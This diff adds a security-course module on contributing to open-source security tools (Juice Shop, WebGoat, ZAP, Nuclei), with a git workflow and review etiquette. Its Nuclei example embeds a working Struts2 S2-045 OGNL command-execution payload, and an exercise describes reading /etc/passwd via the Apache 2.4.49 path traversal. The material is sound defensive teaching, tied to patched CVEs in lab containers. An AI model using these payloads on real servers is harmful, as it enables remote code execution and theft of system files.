@@ -1,0 +1,183 @@
+---
+trackId: cybersecurity-ethical-hacking
+tier: 5
+title: "Contributing to Security Open-Source Tooling"
+order: 1
+estimatedHours: 25
+slug: contributing-to-security-open-source-tooling
+---
+
+## Why This Module Exists
+
+By Tier 5 you've broken your own labs, read disassembly, and chased crashes in a debugger. Contributing to security open-source tooling is a different skill: turning private knowledge into a diff that a stranger — the maintainer — will read, criticize, and, if you did the work right, merge. The deliverable is a pull request and a conversation thread on GitHub, not a write-up nobody reviews.
+
+Everything in this module targets real, named, explicitly-welcoming projects: OWASP Juice Shop, WebGoat, OWASP ZAP, and the Nuclei templates project. Every detection pattern you write here is for a CVE that is already disclosed and already patched, reproduced in your own throwaway lab (a Docker container you can `docker rm -f` when you're done). You are never pointing anything at a host you don't own, and you are never writing detection logic for something unpatched.
+
+## Finding a Tractable Issue
+
+Don't start by reading the whole codebase. Start by reading the issue tracker with a filter.
+
+**OWASP Juice Shop** (`juice-shop/juice-shop`) tags beginner-friendly work `good first issue` and `help wanted`. A realistic example: Juice Shop's challenges each have hint text and a difficulty tier, surfaced through its "Score Board." Typos, stale hint wording after a challenge was reworked, and missing i18n keys in `frontend/src/assets/i18n/*.json` are routinely filed as `good first issue`. These are low-risk, self-contained, and exercise the exact workflow you need for bigger changes later: fork, branch, test, lint, PR.
+
+**WebGoat** (`WebGoat/WebGoat`) structures its content as lesson plugins — Java classes under `src/main/java/.../lessons/<topic>` paired with Markdown/HTML lesson content under `src/main/resources/lessons`. Its `good first issue` label frequently covers things like: a lesson's static hint text no longer matches its current flag-check logic after a refactor, or an assignment class is missing a unit test under `src/test/java`. Both are scoped enough to land a first PR in a weekend without touching the lesson engine itself.
+
+**OWASP ZAP** splits into two repos: `zaproxy/zaproxy` (the core desktop/daemon app, Gradle build) and `zaproxy/zap-extensions` (individual add-ons, one Gradle module per add-on under `addOns/<name>`). Its contribution labels include `good first issue` and `help wanted`, and a typical tractable one is a false-positive fix in an existing passive or active scan rule — e.g., a regex in an add-on under `addOns/ascanrules` or `addOns/pscanrules` that over-matches on a header value. You fix the rule, add or update the add-on's unit test, and you've touched real detection logic used in thousands of pentest engagements without needing to understand ZAP's full extension architecture.
+
+**Nuclei templates** (`projectdiscovery/nuclei-templates`) work differently: there usually isn't a pre-filed issue per template. You write a new YAML detection template for a CVE that doesn't have one yet (or improve one that's inaccurate) and submit it directly as a PR. This is the most mechanical of the four to break into, because the "issue" is really "pick any already-disclosed, already-patched CVE with a public PoC and no existing template, reproduce it in your lab, and detect it."
+
+## Worked Example: A Nuclei Template for CVE-2017-5638
+
+CVE-2017-5638 is the Apache Struts2 "S2-045" vulnerability — the one behind the 2017 Equifax breach. It's disclosed, patched (fixed in Struts 2.3.32 and 2.5.10.1), and has a trivial, well-documented lab reproduction via `vulhub/struts2/s2-045` (spin it up with `docker-compose up -d` in your own isolated environment). The root cause: the Jakarta Multipart parser evaluates attacker-controlled OGNL expressions embedded in the `Content-Type` header before any application logic runs.
+
+A minimal detection template for your own lab instance:
+
+```yaml
+id: CVE-2017-5638-struts2-ognl-content-type
+
+info:
+  name: Apache Struts2 S2-045 OGNL Injection via Content-Type (Detection)
+  author: the-manual-lesson
+  severity: critical
+  description: >
+    Detects the Jakarta Multipart parser OGNL injection in Apache Struts2
+    (S2-045). The Content-Type header is evaluated as an OGNL expression
+    before the request reaches application code, allowing remote command
+    execution. Patched in Struts 2.3.32 / 2.5.10.1. For use against your
+    own isolated, deliberately vulnerable lab instance only.
+  reference:
+    - https://nvd.nist.gov/vuln/detail/CVE-2017-5638
+    - https://cwiki.apache.org/confluence/display/WW/S2-045
+  classification:
+    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 10.0
+    cve-id: CVE-2017-5638
+    cwe-id: CWE-20
+  metadata:
+    verified: true
+    max-request: 1
+  tags: cve,cve2017,struts,rce,oast-bypass-not-needed
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.action"
+
+    headers:
+      Content-Type: >-
+        %{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).
+        (#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).
+        (#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).
+        (#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).
+        (#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').
+        toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).
+        (#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).
+        (#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).
+        (@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "uid="
+          - "gid="
+        condition: and
+
+      - type: status
+        status:
+          - 200
+```
+
+Before you open a PR, validate the template locally and run it only against your own container:
+
+```bash
+nuclei -validate -t CVE-2017-5638-struts2-ognl-content-type.yaml
+nuclei -u http://127.0.0.1:8080 -t CVE-2017-5638-struts2-ognl-content-type.yaml -debug-req -debug-resp
+```
+
+If `uid=` shows up in the response body against your vulhub container and disappears once you rebuild the container on a patched Struts2 version, your template is correct in both directions — that's the test a reviewer will actually run.
+
+## The Contribution Workflow, End to End
+
+Take Nuclei templates as the concrete walkthrough, since its `CONTRIBUTING.md` and template-writing guide are unusually explicit about what a mergeable PR looks like:
+
+```bash
+git clone https://github.com/<you>/nuclei-templates.git
+cd nuclei-templates
+git checkout -b add-cve-2017-5638-detection
+
+mkdir -p http/cves/2017
+cp CVE-2017-5638-struts2-ognl-content-type.yaml http/cves/2017/
+
+nuclei -validate -t http/cves/2017/CVE-2017-5638-struts2-ognl-content-type.yaml
+
+git add http/cves/2017/CVE-2017-5638-struts2-ognl-content-type.yaml
+git commit -m "Add detection template for CVE-2017-5638 (Struts2 S2-045)"
+git push origin add-cve-2017-5638-detection
+```
+
+The PR you open then goes through: (1) an automated CI job that re-runs `nuclei -validate` and a template-quality linter checking required `info` fields (`name`, `author`, `severity`, `description`, `reference`, `classification`, `metadata`, `tags`); (2) a maintainer review focused on false-positive risk, whether the matcher is specific enough, and whether the severity/CVSS classification is accurate; (3) requested changes, which you push as follow-up commits to the same branch (the PR updates automatically); (4) merge once a maintainer approves.
+
+Juice Shop's workflow has the same shape with different tooling. Its `CONTRIBUTING.md` walks you through forking, branching off `main`, and before opening a PR running:
+
+```bash
+npm install
+npm run lint:fix
+npm test
+npm run cypress:run
+```
+
+Juice Shop uses Angular-style commit messages (`feat:`, `fix:`, `docs:`, `chore:`) because its release pipeline runs `semantic-release`, which parses commit prefixes to decide the next version number and generate the changelog automatically — an improperly prefixed commit message is a real reason a PR gets bounced back for a rebase, not a style nitpick.
+
+WebGoat's loop is Maven-centric: `mvn clean install`, then `docker compose up` to smoke-test the running app, then a PR against `develop` with a lesson-plugin class and matching test under the mirrored `src/test/java` path. ZAP's `zap-extensions` loop is Gradle-centric: you build just the add-on you touched (`./gradlew :addOns:<name>:build`), and its guidance explicitly asks you to raise non-trivial changes as an issue or on its developer group *before* investing review time in a large PR — a convention worth following on any project, since it saves you from a maintainer closing a well-built PR because the design direction was wrong from the start.
+
+## Responding to Review Feedback
+
+This is the part contributors underrate. A maintainer comment on your Struts2 template PR might read:
+
+```text
+Thanks for this! A couple of things before merge:
+
+1. The `matchers-condition: and` with two `word` matchers on `uid=`/`gid=`
+   plus a bare `status: 200` is still fairly loose — a Struts app that
+   happens to return "uid=" in an unrelated error page would false-positive.
+   Can you add a dsl matcher that checks the response actually looks like
+   raw `id` command output (e.g. matches `uid=\d+.*gid=\d+`)?
+
+2. cvss-score should be a float matching the vector exactly — double check
+   10.0 is right for this vector, our schema check flagged a mismatch.
+
+3. Please add `max-request: 1` is already there, good — but add a
+   `fofa-query`/`shodan-query` is NOT needed for this one, skip that.
+```
+
+A non-defensive, revising response looks like this — note it doesn't re-argue the original design, it fixes the concern and explains the fix:
+
+```text
+Good catch on the matcher, you're right that `uid=`/`gid=` alone is too
+loose for a generic error page. I added a regex matcher against the
+actual `id` output shape instead of relying on status-code-200 as a
+discriminator:
+
+    - type: regex
+      regex:
+        - 'uid=\d+\([a-zA-Z0-9_-]+\)\s+gid=\d+\([a-zA-Z0-9_-]+\)'
+
+and dropped the plain status matcher from matchers-condition since it
+wasn't adding discriminating power. Also recalculated the CVSS vector —
+10.0 was correct for AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H, so no change
+there, but I can see why the linter flagged it, the vector string had a
+trailing space in my first commit. Fixed. Pushed as a follow-up commit,
+let me know if the regex is still too permissive.
+```
+
+That response does three things worth internalizing: it concedes the specific technical point instead of defending the original code, it explains *why* the fix works rather than just saying "done," and it closes the loop on the second comment with evidence (recomputed the vector) instead of a bare "fixed." That's what gets a second approval instead of a second round of comments.
+
+## Exercise
+
+Reproduce CVE-2021-41773 — the Apache HTTP Server 2.4.49 path traversal (patched in 2.4.50) — in your own isolated lab using the `vulhub/httpd/CVE-2021-41773` Docker Compose setup. Write a minimal Nuclei template that detects it by reading `/etc/passwd` through the `cgi-bin` path-normalization bypass, and validate it with `nuclei -validate` before testing it against your own container only.
+
+Hint: Apache's bug is that `AP_NORMALIZE_edits` rejects a literal `../` but not `.%2e/` sequences in certain path-info contexts — you'll need a `raw` HTTP request block (not a simple `path:` field) so Nuclei sends the exact encoded bytes without its own URL-normalization rewriting them first. Your matcher should look for the literal string `root:.*:0:0:` in the response body, and your template should fail to match once you rebuild the same container against `httpd:2.4.50` or later.
+
+## What You're Actually Practicing
+
+None of this is about becoming an expert in Struts2 internals or Nuclei's YAML schema specifically. It's about the loop every real security-tooling contribution runs on: reproduce the claim in an environment you control, write the smallest artifact that proves it, submit it through the project's actual process instead of a generic one, and treat review feedback as free debugging rather than an attack on your competence. That loop is identical whether the artifact is a Nuclei template, a WebGoat lesson fix, a ZAP scan rule, or — later in your career — a CVE write-up with your own name on the advisory.
